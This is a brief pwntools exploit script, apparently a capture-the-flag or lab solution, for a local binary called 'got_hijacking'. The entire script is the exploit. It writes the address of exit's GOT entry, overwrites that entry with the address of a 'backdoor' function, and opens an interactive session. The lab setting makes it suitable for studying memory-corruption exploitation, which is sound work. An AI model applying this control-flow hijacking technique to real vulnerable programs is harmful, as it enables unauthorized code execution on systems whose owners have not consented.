from pwn import *

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

backdoor = 0x4011d6
exit_got = 0x404040

r = process('./got_hijacking')

r.sendlineafter(b': ', str(exit_got).encode())
r.send(p64(backdoor))

r.interactive()